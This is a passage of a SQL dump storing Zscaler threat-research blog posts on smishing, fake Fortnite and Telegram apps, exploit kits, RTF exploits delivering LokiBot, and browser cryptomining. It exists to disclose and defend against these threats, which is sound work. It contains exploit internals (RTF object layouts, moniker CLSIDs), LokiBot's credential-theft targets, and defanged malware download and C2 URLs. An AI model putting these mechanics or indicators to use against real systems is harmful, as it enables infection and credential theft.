this to work around the rules and create homographs which are displayed as IDNs despite being malicious in nature.     Zscaler ThreatLabZ is actively monitoring such attacks, to ensure that Zscaler customers are protected.    How can users protect themselves?    Users should exercise caution before clicking on any links shared via SMS or IM application, even when they are from trusted contacts. The IDN format display is controlled by the browsers design and end users have limited control over how the URL is being displayed. The primary and most effective option would be to make use of password managers which check the URLs before entering the passwords into the website, this reduces the chances of users entering credentials to a homograph URL phishing website. The secondary check would be to carefully observe the URLs to spot any obvious character switches.', 'Phishing', 'https://www.zscaler.com/blogs/research/smishing-punycode');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (30, 'Fake Fortnite Apps Scamming and Spying on Android Gamers', 'Viral Gandhi', 'May 17, 2018', 'Fortnite is a co-op sandbox survival game developed by Epic Games and People Can Fly and published by Epic Games. The game was released for Microsoft Windows, macOS, PlayStation 4, and Xbox One on July 25, 2017.    Fortnite now has 45 million players and more than three million concurrent users, which makes it one of the most popular games on the market right now.    Recently, Epic games announced that it would extend its support to mobile platforms and it launched the game for iOS. A version for the Android mobile platform has not been announced, leaving Android users—eager to play this game on their devices—searching for it. Such situations involving popular games always seem to attract malware authors looking to spread their payloads disguised as fake games.    In the past, the ThreatLabZ research team has seen fake Super Mario and Pokemon GO apps in the wild during the release of the legitimate versions. We observed this trend with Fortnite as well, in which multiple instances of Android malware were posing as the Fortnite game. The malware included spyware, a coin miner, and some unwanted apps disguised as the game.    Fake Fortnite game - Spyware    In one instance, we observed Android spyware disguised as the Fortnite game. Upon installation, an icon appears with the Fortnite name, as shown below.                                                                                    Fig1: Icon    Upon installation, the spyware begins harvesting call logs, including outgoing and incoming calls, missed calls, and phone contacts. The malware is able to make calls as well.                                                                                    Fig 2: Harvesting call logs                                                                                 Fig 3: Accessing Contacts                                                                               Fig 4: Making Calls    It can also send SMS and harvest SMS logs:                                                                             Fig 5: Harvesting SMS                                                                               Fig 6: Sending SMS    We observed a prompt for allowing Accessibility services from this spyware, which can allow it to do certain privileged operations without the user\'s interaction (although it is not implemented as efficiently as examples we’ve seen in banking malware and ransomware, in which devices are completely locked until access is enabled).                                                                     Fig 7: Usage of accessibility functionality    Along with all the harvesting, the spyware can carry out the following operations:      	Accessing camera and taking pictures  	Wiping device data  	Accessing accounts  	Reading keystrokes  	Accessing file manager  	Recording audio      This spyware creates a \"files\" folder under its installation directory. Under that directory it writes all logs on a daily basis. Files and harvested data can be observed in the following screen shot. Along with the data, key logging activity is visible in the screenshot, where the spyware is reading keystroke by keystroke and storing the data to file.                                                                       Fig 8: Logging data into files    The following screenshot shows harvested call logs.                                                                   Fig 9: Call logs harvesting    We have not yet seen any connection made by this spyware to its command-and-control (C&C) servers. This may indicate that the spyware is still under development. We have observed some strings in the payload that appear to be connected to the Spynote RAT builder, and it is possible that this malware was built with it.    Fake Fortnite game - Coin Miner    In another incident, we observed the coin miner payload being spread as the fake Fortnite game.    URL:hxxps://cdn[.]androidapk[.]world/downloads/com[.]fortnite[.]apk    The domain androidapk[.]world is well-known for hosting Android coin mining apps, and it now has a coin miner app disguised as a fake Fortnite game as seen below.                                                                          Fig 10: Site serving coin mining apps.    This malware has CoinHive JavaScript embedded in the file named as “engine.html” in the asset folder of an Android package, as shown in the following screenshot.                                                                            Fig 11: CoinHive JavaScript    Coin mining activity is started by calling the “engine.html” file from the asset folder in the code. See screenshot below.                                                                               Fig 12:  Initiating mining    As shown above, the code is triggering the HTML file containing the CoinHive framework for initiating mining.    We monitored the app on a device and found that this coin mining app significantly raises CPU usage once installed. See the following screens that show usage before installation and after installation.                                                                                                                                                  Fig 13: Before installation                                                                              Fig 14: After installation    We have not noticed any disclaimer notifying the user that the device will be used for coin mining activities. As coin mining activity uses CPUs and GPUs, it will drain a mobile device’s battery and may slow down the infected device.    Fake Fortnite game - revenue generation/app promotion campaigns:    Along with spyware and coin mining apps, we observe some of the domains promoting the release of the Fortnite game on Android and serving unwanted apps showing ads and generating revenue for authors.    The following are the domains:      	androidfortniteapk[.]com  	betafortnite[.]com  	officialandroidfortnite[.]com/androidfencpiandroid/      Fake Fortnite game virtual currency app (V-Bucks) on Google Play    We also came across an app on Google Play that claimed to help Fortnite players earn free V-Bucks but in reality was a complete scam.                                                                                  Fig 15: Sites serving the fake Fortnite game    Once installed, the app show the fake Fortnite Battle Royal V-Bucks generator screen as seen below.                                                                               Fig 16: Fake screen for V-Bucks      The app asks users to leave suggested promotional comments and a 5-star rating on the app’s Google Play store page, as shown below.                                                                                 Fig17: Fake screen for V-Bucks    Interestingly, to avoid making users suspicous, the app will offer random promotional comments from it’s comment list stored in the website code. Observe here:                                                                              Fig18: Fake comments    The same comments can be observed on the Play Store page as well.                                                                          Fig19: Fake comments on Google Play store    Such positive comments will definitely lure more victims and earn more revenue for the app developer.    The app then asks users to the provide numbers of the vbucks needed to be generated. Upon clicking the generate button it will provide prompts for the human verification screen, which will lead to the downloading of more apps and surveys, as shown here.                                                                                  Fig 20: Fake survey    After completing the survey and downloading the suggested apps, the user doesn\'t receive free V-Bucks, but the app author definitely generates real revenue. This fake app was downloaded over 5 thousand times and has been rated five stars over four thousand times, before we reached out to Google Security team who promptly removed the app.    Along with this fake app, we observed fake domain names registered to disguise another fake release of the Fortnite game on the Android paltform.     Following are these domains:      	androidfortniteapk[.]com  	betafortnite[.]com  	officialandroidfortnite[.]com/androidfencpiandroid/                                                                               Fig 21: Sites serving fake Fortnite game    Once installed, these apps show a fake Fortnite game playing screen which is pretty neat and actually look like the official game along with the game’s music.                                                                              Fig 22: Icons                                                                            Fig 23: Fake Fortnite gaming screens.    Once a user clicks on the screen, the app asks for mobile verification and redirects to a browser asking the user to fill out the survey. This leads to the downloading of other apps which will generate revenue for the app developer as shown below.                                                          Fig 24: App promotion for revenue generation    Conclusion:    There is no official news from Epic games about the release of the Fortnite game on the Android platform. Users should beware of malware authors looking to exploit their desire to play Fortnite on Android. We urge users to download games only from authorized and legitimate sources, such as Google Play.    To avoid becoming a victim of such malware, it is a good practice to uncheck the \"Unknown Sources\" option under the \"Security\" settings of your device. This will prevent you from inadvertently downloading fake apps, which are sometimes convincing in their design. Additionally, users should also check comments and rating of the app even when downloading them from Google Play store.    If a user becomes aware that there is spyware on their phone, here are the steps they should perform for remediation:      	Step 1. Disable Accessibility access for Fortnite app: Settings -> Accessibility -> Fortnite (App name) -> Turn off access  	Step 2. Remove the Fortnite app: Settings -> Apps -> click on Fortnite icon -> Uninstall.      Zscaler ThreatLabZ is actively monitoring fake apps posing as the Fortnite game, and others, to ensure that Zscaler customers are protected.', 'Mobile Malware', 'https://www.zscaler.com/blogs/research/fake-fortnite-apps-scamming-and-spying-android-gamers');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (31, 'Top Exploit Kit Activity Roundup – Spring 2018', 'Rohit Hegde', 'May 11, 2018', 'Overview    This is the eighth in a series of blogs by the Zscaler ThreatLabZ research team collecting and analyzing the recent activity of the top exploit kits. Exploit kits (EKs) are rapidly deployable software packages designed to leverage vulnerabilities in web browsers and deliver a malicious payload to a victim’s computer. Authors of EKs offer their services for a fee, distributing malware for other malicious actors. What follows are highlights from the EK activity we observed during the last quarter.         RIG Exploit Kit    RIG EK has been the most active exploit kit, but its activity has decreased in comparison with previous quarters. We can see minimal RIG EK activity in the month of January, but it picked up again in the second half of April. We are seeing different payloads delivered by RIG this quarter, and they varied from ransomware and banking Trojans to crypto mining software—as opposed to its more typical payload of Cerber ransomware. Below we can see the hits for RIG EK activity.        Fig 1: RIG EK Hits from 1st Jan 2018 to 30th April 2018.    The geographical distribution of the hits is shown below.        Fig 2: RIG EK Heat Map showing infected regions.    Most infection attempts are seen in the United States, Spain, and Switzerland this quarter, while last quarter, activity was only observed in the United States and Russia.     The most common RIG EK redirects were observed from illegal streaming websites, which provide users with free, live sports feeds. The malvertising on these websites fingerprints a user\'s machine, as per the attacker\'s configuration on the Traffic Distribution Systems; the most recently active one is Black TDS. An example of such a streaming domain is nba-stream[.]online, which sends users to malvertising domains like www.ligtv-izle[.]net/ads/ad2.html. The RIG EK cycle that follows is shown below.        Fig 3: RIG EK Infection cycle.    There were common patterns observed in the RIG EK landing page URLs, which would change on weekly basis, but the landing page content has remained mostly unchanged.        Fig 4: RIG EK landing page URLs with common parameters.     The obfuscated RIG EK landing page is shown below.        Fig 5: RIG EK Obfuscated landing page.    One significant change is the inclusion of the CVE-2018-4878 Adobe Flash vulnerability, which affects Adobe Flash Version 28.0.0.137 and earlier versions.    When we open the downloaded Flash file using a decompiler, we found the section of the pointer to the listener object, which is responsible for this vulnerability. This is highlighted in the image below.        Fig 6: RIG EK Flash with CVE-2018-4878        Fig 7: RIG EK Flash with CVE-2018-4878    We saw the RIG EK downloading GandCrab ransomware instead of the usual Cerber ransomware. Other payloads we saw included cryptocurrency miners, along with Trojans like Bunitu and Ramnit.         GrandSoft Exploit Kit    GrandSoft Exploit Kit is an old exploit kit that has become active again. This EK consists of simple JavaScript redirects without any obfuscation. The landing page was seen serving CVE-2016-0189, which is a scripting engine memory corruption vulnerability.     The GrandSoft EK activity hits are shown below.        Fig 8: Grandsoft EK Hits from 1st Jan 2018 to 30th April 2018    The geographical distribution of the hits can be seen below.        Fig 9: Grandsoft EK Heat map showing infected regions.    GrandSoft EK redirects were seen from malvertising chains and the hits are distributed globally. The EK does not seem to be targeting any specific geographic region.     The GrandSoft EK cycle can be seen below.        Fig 10: Grandsoft EK cycle    We see that the gate contains a simple JavaScript redirect, as shown below.        Fig 11: GrandSoft EK Javascript Redirect    This call loads another JavaScript-based redirect to the landing page.        Fig 12: Grandsoft EK Landing page redirect    The landing page snippet with the CVE-2016-0189 code is shown below.        Fig 13: Grandsoft EK Landing page with CVE-2016-0189    The payload seen in this cycle was GandCrab ransomware; this can be seen in the temp directory of the infected machine.        Fig 14: Grandsoft EK downloads GandCrab ransomware to the victim machine.         Other exploit kits    Magnitude EK activity was observed this quarter, but it was targeted in South Korea. The EKs that were showing reduced activity in the last quarter, such as Terror EK, Disdain EK, and Kaixin EK, are no longer showing any activity.         Conclusion    Exploit kits are effective, as they can infect a victim\'s machine during web browsing without the user\'s knowledge. The attackers monetize the successful infections by collecting a ransom for retrieving data encrypted by ransomware, mining cryptocurrencies using the victim\'s system resources, or installing banking Trojans to steal a victim\'s identity. Attackers frequently change their techniques by obfuscating the source code or integrating new exploit code into their EK, and security researchers analyze and block the new threats by tracking changes in the EK behavior.      To help avoid infections from exploit kits, users should always block untrusted third-party scripts and resources, and avoid clicking on suspicious advertisements. Keeping the browser plugins and web browsers up to date with latest patches helps to protect against common vulnerabilities targeted by exploit kits. The Zscaler ThreatLabZ research team has confirmed coverage for these top exploit kits and subsequent payloads, ensuring protection for organizations using the Zscaler cloud security platform.', 'Exploit Kit', 'https://www.zscaler.com/blogs/research/top-exploit-kit-activity-roundup-spring-2018');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (32, 'Fake Teleg\'e\'ram on Google Play', 'Shivang Desai', 'May 03, 2018', 'Recently, the Russian government ordered the immediate blocking of the messaging app Telegram and requested its removal from the Apple App Store and Google Play Store. In reviewing activities around this matter, Zscaler ThreatLabZ researchers noticed a fake Telegram app making the rounds in the Google Play Store. Zscaler informed Google about the fake app and it was promptly removed from the store.     Because Telegram is partially open-source, we initially thought this fake Telegram app was a regular app implementing Telegram APIs. However, upon further analysis, we found that the fake app had been repackaged, in which case it is possible that a developer simply decompiled the original Telegram app and added advertisement libraries. We also noticed that the name and icon of the fake app changes after installation. Our analysis is detailed below.     App Details     Name: Telegraph Chat (which changes to Teleg\'e\'ram after installation)   Package Name: com.telegeram.anydev  Hash: 1f188831ec559566f8746e5e57bb1fcbb0f30ead  VT count: 2/62 (at time of analysis)     The screenshot below shows the fake Telegram app (left) and the original Telegram app (right). The fake app portrayed itself as Telegraph Chat and the Play Store description of the app was precisely the same as the original Telegram app. The only differences were that the term Telegram was changed to Telegraph Chat and the app icon was slightly altered after installation.      	  		  			  		  		  			Fig 1: Fake app vs original app (Google Play Store)  		  	           The screenshot below on the left shows the app as it appears in Google Play, displayed as Telegraph Chat. The screenshot on the right shows how the app changes after installation, displaying a different icon and name, Telegeram (notice the extra “e”).      	  		  			  		  		  			Fig 2: Fake app name/icon change  		  	           As soon users try to open the app, they are bombarded with different types of ads. Below is a screenshot of banner ads inside the app (left) and an interstitial ad (right).       	  		  			  		  		  			Fig 3: Ads displayed by fake app  		  	           In one instance, we also noticed an obfuscated piece of code sent by the server that contained a Play Store link to browser named Silver Mob US Browser. We could not analyze this app because it had been removed from Google Play Store before our investigation began. The screenshot below shows the response and further functionality.       	  		  			  		  		  			Fig 4: Download link leading to \'removed\' Play Store app  		  	           Adware, such as this example, presents a threat, because it is capable of providing links that can lead users to download highly malicious Android apps.     In our analysis, we noticed that the fake app performed original Telegram app\'s messaging functions, but other functions were missing. We tried calling to other numbers, which is a functionality in the original Telegram, but the fake app stopped working, as shown in the message below:      	  		  			  		  		  			Fig 5: Fake app fail.  		  	        Conclusion    Telegram is a popular app with 200 million users, according to its own reports. But with the confusion brought about the actions of the Russian government, bad actors have seized an opportunity to present an app that may trick users searching for Telegram into downloading a malcious app. This technique is often used when an app is popular (see Pokemon GO) or, in this case, in the news.    Fake versions of popular apps are an ongoing problem, and once such an app has been downloaded on a mobile device, it is easy for the developer to open a gateway for more downloads and installation of malware.     Users should always take appropriate precautions before installing any app, even in trusted stores like Google Play or Apple App Store. One effective precaution is to read other users’ reviews before installation.                	  		  			  		  		  			Fig 6: Google Play reviews for fake Telegram app  		  	           ThreatLabZ will continue to track and ensure coverage for fake Android apps to protect Zscaler customers.', '', 'https://www.zscaler.com/blogs/research/fake-telegeram-google-play');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (33, 'CVE-2017-8570 and CVE-2018-0802 exploits being used to spread LokiBot', 'Mohd Sadique', 'April 26, 2018', 'Zscaler ThreatLabZ has been tracking the usage of malicious RTF documents that leverage CVE-2017-8570 and more recently CVE-2018-0802 vulnerability exploits to install malicious payload on the victim machine. In this blog, we\'ll share our analysis of a campaign leveraging these two exploits to deliver LokiBot.    These malicious documents spread by using phishing emails to trick users into opening and executing them.        Fig 1: Malicious documents weaponized with exploits to infect target machine    An example of a phishing spam email with an attached malicious RTF document is shown below.        Fig 2: Phishing spam email with attached malicious RTF document    In case of the LokiBot spreading campaign we saw that these documents were either weaponised with CVE-2017-8570 or CVE-2018-0802 exploit paylods.    The workflow of both exploits is shown in the below.        Fig 3: Workflow of CVE-2017-8570 and CVE-2018-0802    CVE-2017-8570    This exploit bypasses the Microsoft patch for CVE-2017-0199. It makes use of a composite moniker in the RTF file to execute a Windows Script Component (WSC) file or scriptlet on the victim’s machine. A scriptlet is a XML file wrapping a script like VBScript, JavaScript, etc.    The RTF document uses a Packager.dll trick to drop an SCT file into the %TEMP% directory and execute it using the escalated privilege that the vulnerability provides.    The document has two objdata encoded and embedded in it, as shown below.        Fig 4: Objdata1 “Package” ActiveX control    01050000 02000000 = OLE object  08000000 = Length of following string  5061636B 61676500 = ActiveX name “Package”  CB060000 = Data length of following binary data    Upon executing the RTF file, the embedded SCT file is dropped in the %TEMP% directory with the name V2BRUIICCL75CPT.sct.  This SCT file will be executed by a second objdata in the RTF document.        Fig 5 : Objdata2 “OLE2Link” leveraging composite moniker    The RTF has a composite moniker, file moniker, and new moniker working together.  The byte sequences shown in the Fig 5 are the binary representation of following CLSID.  {00000309-0000-0000-C000-000000000046} = Composite moniker  {00000303-0000-0000-C000-000000000046} = File moniker  {ECABAFC6-7F19-11D2-978E-0000F8757E2A} = New moniker      After the file moniker CLSID, there is a length field followed by the file path, which is going to execute the new object persisted in “%TMP%\\V2BRUIICCL75CPT.sct”.  In short, this object will execute the file by using composite moniker in the RTF document.    The dropped SCT file looks like the screen capture below.        Fig 6: %TEMP%\\\\V2BRUIICCL75CPT.sct    This SCT file is dropped and executed by the RTF document. The SCT file has JavaScript, which downloads malicious executable price.exe from juanjoseriffo[.]com/ed/price.exe, saves it to %APPDATA% with name windowsis.exe, and executes it.    CVE-2018-0802:    This exploit is a CVE-2017-11882 patch bypass vulnerability of type stack overflow.  This vulnerability will only work on systems updated with CVE-2017-1182 patch.    The logic behind this loophole is similar to the remote code execution vulnerability (CVE-2017-11882) using office embedded formula editor EQNEDT32.EXE.         Fig 7: RTF file exploiting CVE-2018-0802    The first object data of the document file is using Packager.dll to drop the file into the %TEMP% directory. The malicious executable file, having the length 0x000868B6, will be dropped in the %TEMP% directory with the name price.exe.    Like CVE-2017-11882, the actual data for this vulnerability is in the equation native stream of the OLE object, which is shown in the below image.        Fig 8: Equation native stream of OLE object in RTF document    The dropped file %temp%\\price.exe will be executed via the Microsoft Windows command shell.     LokiBot:    The malicious executables dropped by the RTF documents, leveraging the above two exploits, are from LokiBot family. LokiBot is a malware capable of stealing user\'s private data including stored credentials and cryptocurrency wallets. The stolen information is relayed back to the Command & Control (C&C) server. The LokiBot malware payloads seen in this campaign were compiled using Borland Delphi and were UPX packed.    Upon execution, the malware copies itself to the startup folder at “%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup.” to ensure persistence on system reboot.    After that, the sample reads the machine GUID from the registry key HKEY_LOCAL_MACHINE\\SORTWARE\\Microsoft\\Cryptograpy\\MachineGuid using RegOpenKeyEx and RegQueryValueEx Functions.        Fig 9: Obtaining machine GUID    Once the machine GUID is obtained from the registry, LokiBot calculates the MD5 hash of the machine GUID by calling CryptAcquireContext, CryptCreateHash, CryptHashData, and CryptGetHashParam APIs.    The sample trims the MD5 hash of the machine GUID to 24-charachters and creates a mutex with this name as seen below.        Fig 10: Mutex creation    The purpose of mutex is to ensure that only one payload of LokiBot is running on the infected system.    Information Stealing module    Once installed, Lokibot is capable of stealing stored credentials and other private information from the following applications:      	Mozilla Firefox  	Opera  	Apple Safari  	Internet Explorer  	Google Chrome  	Chromium  	Easy FTP  	DeluxeFTP  	WinSCP  	Outlook  	CheckMail  	Filezilla  	NetDrive  	myFTP  	Putty  	360 Browser  	KeePass, and more      LokiBot creates a hidden directory in %APPDATA% where the directory name is string extracted from 8th through 13th characters of the Mutex name. It creates four files in the hidden directory at the running time, all of which are named using string extracted from 13th through 18th characters of the Mutex name.        Fig 11: Files created by LokiBot    File descriptions:  .exe - Copy of malware that will execute every time when user logs in  .hdb - Database of hashes of data that has been sent to C&C server  .kdb - Keylogger data that has to be sent to C&C server  .lck - Lock file created to prevent resource conflicts    After all the target applications have been profiled for stored credentials, LokiBot prepares harvested data and sends it to the C&C server.        Fig 12: POST request to C&C server        Fig 13: First data sent to C2 server    The information transmitted by LokiBot contains system information, application data, Windows credentials, cryptocurrency wallet, keylogger data, screenshots etc. It will send a request every 10 minutes to the C&C server requesting C&C commands, and the malware acts in accordance with the C&C commands.    Zscaler Protections:    Microsoft released security updates for CVE-2017-8570 and CVE-2018-0802.  Zscaler detects these malicious RTF documents as “CVE-2017-8570” and “CVE-2018-0802”.  Zscaler detects LokiBot payloads as “Win32.PWS.Lokibot”.    The Zscaler Cloud Sandbox report for this threat can be seen below.        Fig 14: Zscaler Cloud Sandbox LokiBot report    IOCs:    MD5 : [CVE-2017-8570 & CVE-2018-0802]  A63D162C20A1ACA48F70FAAE80A0F1DE  B94D468D389F65C2BA48ECEF422EF7BA  1C633806DE81C9181DA572CE40E32254  9D76516A8212641A83B62DD152AED8D9  98AF7F0B4B7DB96AC2A18786D50C6979  C0A2F49FA6FF98FBDAE0A9B21E40D6D3  C33B99043E9C3FC4E8E678365D7F1C7D  3F54763388A88AA66CF3FCE564B9B12F  F1B3A174A2849605694372C6010AEB87  E1921789F0A834A1183D73542D53BB9D  FA45C8D1FBAE6E160CB848497717CB53    MD5 : [LokiBot]  C2471F6F9736994942D50D176DDC4E6D  558B7CBE06972081568F8F634E0226FB  FC8E0D4BBF779D6AFCC4FD3E1213BB5D  FF6DBE6B48CF118DF6449A1BA62D3F7F  E90AB350B42205B06E33441A6B782659  4195192B66A50FD0641019F634D2C86C  EAF119844AEDA0E40A87995786D5C44C  AC26ECE0774DB979D672890F4C2F6F88  CEF9679A154D5290C0BD58B6CE765982  ABD6554A587CAF338AB4CD514EA2D3FF    Network:  juanjoseriffo[.]com/ed/price.exe  sariraatjgaye[.]com/edu/fre.php  31.3.230[.]31/bin/chi.exe   grernont[.]com/Chisom/five/fre.php  b.reich[.]io/pjrazz.exe  b.reich[.]io/vncqoy.exe  b.reich[.]io/ymqrza.exe  192.189.25[.]114/dew1/fre.php  192.189.25[.]17/guy2/fre.php  fiebiger[.]us/222.exe  umumi[.]xyz/222.exe  umumi[.]xyz/js2.exe  adimm[.]xyz/onyem/fre.php  umumi[.]xyz/shaq1.msi  umumi[.]xyz/zu/fre.php  adimma[.]xyz/ben66.msi  adimma[.]xyz/benji/fre.php  klk[.]host/2018/iy.exe  klk[.]host/2018/li.exe  klk[.]host/2018/pa.exe  klk[.]host/iykesettings/settings/settings/settings/settings/settings/fre.php  20dollars[.]co/assetss/css/images/open/eric.exe  extrainformativo.com[.]au/wp-content/themes/travelify/library/font/Gen/fre.php  lemonwood.co[.]za/wp-admin/css/colors/blue/main/shoe.exe  kbfvzoboss[.]bid/alien/fre.php', 'Analysis;Evasion/Stealth;Exploit;Malware;Microsoft;Vulnerability', 'https://www.zscaler.com/blogs/research/cve-2017-8570-and-cve-2018-0802-exploits-being-used-spread-lokibot');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (34, 'Cryptomining is here to stay in the enterprise', 'Deepen Desai,', 'April 10, 2018', 'After Bitcoin hit highs above $19,000 in December, cryptocurrency has received even more attention as speculation about the currency continues.  It should be no surprise then that there has been a rise in cryptomining activity. Cryptomining is “the process by which transactions are verified and added to the public ledger, known as the block chain, and also the means through which new bitcoin are released.  Anyone with access to the internet and suitable hardware can participate in mining.” Source: Investopedia     But it is also possible to mine cryptocurrency without running a dedicated application on a computer that you access or control. Web-based methods allow website operators to use scripts to mine cryptocurrency within a browser, using the resources of the website visitor. We reported on the rise of this in our October 2017 blog, where our Zscaler ThreatlabZ research revealed the sudden interest and growth in web-based monetization towards coin mining.    As we have continued to monitor the trend in 2018, the volume of cryptomining transactions has grown. In the last six months we have blocked more than 2.5 billion cryptomining attempts.  We’ve been actively monitoring the trend and believe this can be explained by the following developments:      	Given the sharp increase in value of cryptocurrency, legitimate sites are adopting cryptomining as a source of revenue over online advertisement. These sites will offer visitors a choice between seeing ads or being mined in order to view the site content.  	Cybercriminals are also taking advantage of this trend by injecting JavaScript code into compromised legitimate sites to conduct cryptomining activities unbeknownst to site owners and visitors.  	In some cases, malicious advertisements are being leveraged for browser-based cryptomining activities.      Enterprise networks are being impacted in various ways. Unwanted and unidentified mining activity inside networks causes increased wear and tear on corporate hardware, as the mining increases CPU cycles. Mining activity also hogs corporate network bandwidth and causes performance issues.    In this blog, we will cover the trends and technical details of the top five cryptominers based on the volume of transactions we are seeing along with recent statistics.    In the last six months, Zscaler successfully detected and prevented approximately 2.5 billion web-based coin-mining attempts in the Zscaler cloud. The following is graphical representation of coin-mining attempts, showing CoinHive as the most active cryptominer service, which is not all that surprising when you consider that CoinHive was first to commercially launch a browser-based cryptomining service in September 2017.        Fig. 1 - Cryptomining attempts by top-performing cryptomining service types between October 2017 to March 2018    Zscaler ThreatLabZ observed an increase in cryptomining among the top 100,000 sites globally according to ranking by Alexa. The following is a breakdown by category of close to 500 of Alexa top 100K domains with embedded cryptomining web service that were not involved in serving any other malicious content.        Fig. 2 - Category distribution of Alexa top 100k sites with embedded cryptomining    As you can see, the category of domains that were used most for browser-based mining activity include nudity/pornography followed by streaming media. The average browsing time for users on video streaming sites tends to be higher allowing miners to maximize their activity as users stay on these sites to view movies or play games. Note that the professional services and marketing category sites ranked high as well, demonstrating the prevelance of mining activity on corporate networks.      This new web-mining trend has attracted a few more crypto-miner players into the market. Zscaler has successfully blocked all mining attempts from these new players and continues to actively track their activities. That said, we are certain that there will continue to be new players that will garner more market share.    New crypto-miners:      	Project-Poi  	Coin-blind  	Coin-nebula  	Coin-Have  	Coin-Imp      We will share new trends in web-based crypto-miners through regular updates. Now, let’s jump into the technical details to see what\'s going on under the hood.    Basics on web-based coin-miner:    The following image shows  typical coin-mining activity, where the user visits a site that has been embedded with mining JavaScript, and this, in turn, redirects the user to the coin-miner web service and starts churning the user’s CPU cycles.        Fig. 3 - Browser-based cryptomining activity workflow    Technical details of the top 5 cryptominers:    CoinHive:    As previously mentioned, CoinHive dominates the cryptominer market and represents a whopping majority of cryptominers in the enterprise traffic seen on the Zscaler cloud, and with the fastest growth. In the process of tracking this miner, we have noticed that the embedding of CoinHive in websites has evolved over time. We saw numerous compromised sites using JavaScript obfuscation and final code masquerading as Google analytics JS code to viewers.    The following screen capture shows obfuscated Coin-Hive JavaScript.        Fig. 4 - Obfuscated CoinHive JavaScript    The decoded version of the above script clearly shows the CoinHive JavaScript.         Fig. 5 - De-obfuscated CoinHive JavaScript    The de-obfuscated code contains a non-dotted decimal IP address, which translates to 185.209.23.219 and miner key NPRak9QU4lFBSneFt23qEIChh5r0SZev.    The following is a Fiddler (web debugging software) capture of CoinHive transactions:             Crypto-Loot:    This web-based miner has gained some popularity among attackers and malicious website owners. We expect to see a significant rise in the use of Crypto-Loot in the near future. This is partly due to this miner’s price. It has a 12% service charge, which is very low compared to the 30% charged by CoinHive, and is likely to boost Crypto-Loot’s adoption.    The following screenshot shows the Crypto-Loot API embedded in JavaScript.         Fig. 6 - Crypto-Loot API embedded in JavaScript    In the following Fiddler image, we can see that texas-register[.]com redirects to crypto-loot.com to initiate mining activity.        Fig. 7 - Redirection to Crypto-Loot    JSE-Coin:    Technically, this crypto-miner differs from other miners, though it does have a similar approach to Google AdSense and other analytical or advertisement platforms, where a webmaster embeds an external JavaScript file into a website.    But in the case of JSE-Coin, a site using JSE mining has a separate, independent JavaScript hosted on its server. We can see the JSE-Coin embedded in freefansitehosting[.]com in the following image.        Fig. 8 - JSE-Coin embedded in the website’s server         The following Fiddler screen shows the transaction in which the affected website leads the visitor to jsecoin[.]com to kickoff coin mining activity.        Fig. 9 - Leading the user from one website to the JSE-Coin site    DeepMiner:    DeepMiner is a free, open-source JavaScript library for mining XMR (Monero) or ETN (Electroneum) cryptocurrency. This library can be embedded in a website, as shown below.        Fig. 10 - DeepMiner embedded in website    The following are Fiddler transactions of a website that has embedded DeepMiner.        Fig. 11 - Transactions that move the user to DeepMiner for cryptomining    Minr:    Currently, Minr has a pretty thin adoption compared to other crypto-miners. To embed Minr in the website, the developer provides the API. The following is the API syntax:      	www.miner-host.com/js/GENERATED_KEY.js?trl=0.5&sc=false  	  		Trl : Throttle of worker (CPU usage)  		sc : Referer check  	  	      The following domains are involved in the Minr cryptomining service:      	minr.pw  	web.clod.pw  	cdn.static-cnt.bid  	web.dle-news.pw  	ad.g-content.bid  	cloudcdn.gdn  	cdn.rove.cl  	static.hk.rs            Let’s look at a sample to explain Minr in more detail. In the following infection, eldiariodetandil[.]com is a domain that has Minr embedded, where static-cnt[.]bid is used as a Minr web-service, and the random capital letters in part of the URL are an API key.        Fig. 12 - Site embedded with Minr    Recently, we have observed that attackers are using JavaScript obfuscation to evade static detection of a Minr mining attempt. The following screenshot shows a heavily obfuscated Minr script within patsitalian[.]com.         Fig. 13 - Obfuscated Minr script    The de-obfuscated content is shown below.         Fig. 14 - De-obfuscated Minr content    Cryptomining activity around the world:    Cryptomining activity is taking place worldwide, but the U.S. leads in both, cryptomining users and in the hosting of servers that are involved in mining activity. In fact, U.S. numbers in both categories are more than double that of the next country on the list. As you can see in the map below, all the users in Europe combined still amount to fewer users than those in the U.S., and the number of servers in the U.S. are more than twice that of the number in Russia.        Fig. 15 - One month sample of the top 10 countries with cryptomining users and servers    Conclusion:    It is clear that cryptomining is not going away and that it is increasing exponentially in popularity. However, the practice, whether done with permission or not, raises many questions, particularly in ethical terms and compliance requirements and practices. Corporations that unknowingly have cryptomining activities taking place on their networks may be at risk of compliance violations in that there is unidentified action taking place on company systems.  There are also ethical questions, such as whether or not site owners that have granted permission for their site to be cryptomined are responsible for notifying and educating site visitors on how their systems will be affected by this activity. Regardless, both enterprises and consumers suffer the same effects of cryptomining, including added CPU cycles, increased power use, and hardware erosion.    There is also an elevated risk of exposure to malware due to the use of JavaScript by many of these cryptominers. Once injected into a site, JavaScript code can be easily manipulated by a cybercriminal for other uses, exposing consumers and employees in enterprises to other harmful attacks.     As is the case with many new technologies, we are in limbo when it comes to regulation and disclosure requirements for cryptomining. However, one small city has taken the first step in regulation. Plattsburgh, New York, has banned cryptomining for 18 months in an effort to stop the enormous energy usage the practice takes. We will most likely see more cities and states follow suit.    Attackers always aspire for quick and easy ways to generate revenue, and in-browser coin-mining is lucrative and less intrusive to the victim. To protect yourself, there are a few things you should do to avoid in-browser coin-mining activities like the ones we’ve discussed here.      	Watch out for a sudden spike in memory use that causes the PC to become slow  	Disable JavaScript in your browser and enable it only when visiting trusted websites  	Block the aforementioned coin-mining domains      Zscaler ThreatlabZ is actively tracking various web based mining services and ensuring coverage for it under Cryptomining threat category.', '', 'https://www.zscaler.com/blogs/research/cryptomining-here-stay-enterprise');
